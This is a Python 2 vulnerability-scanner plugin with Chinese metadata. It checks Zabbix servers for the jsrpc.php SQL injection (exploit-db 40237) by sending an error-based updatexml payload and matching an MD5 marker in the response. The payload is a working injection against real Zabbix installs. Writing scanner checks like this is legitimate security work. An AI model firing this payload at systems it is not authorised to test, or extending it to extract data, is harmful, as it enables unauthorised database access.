#coding:utf8
import re
import urllib2

def get_plugin_info():
    plugin_info = {
        "name" : "Zabbix jsrpc SQL注入",
        "info" : "此注入漏洞需要登录使用，zabbix 默认开启 Guest 用户。",
        "exp_url" : "https://www.exploit-db.com/exploits/40237/;https://github.com/Medicean/VulApps/tree/master/z/zabbix/1",
        "docker" : "docker pull medicean/vulapps:z_zabbix_1",
        "other" : ""
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        url = "http://" + ip + ":" + str(port)
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        request = opener.open(url + "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x36),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17", timeout=timeout)
        res_html = request.read()
        if 'c5a880faf6fb5e6087eb1b2dc' in res_html:
            return u"存在SQL注入"
        payload = "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1 or updatexml(1,md5(0x36),1) or 1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
        res_html = opener.open(url + payload, timeout=timeout).read()
        if 'c5a880faf6fb5e6087eb1b2dc' in res_html:
            return u"存在SQL注入，POC：" + payload

    except:
        return

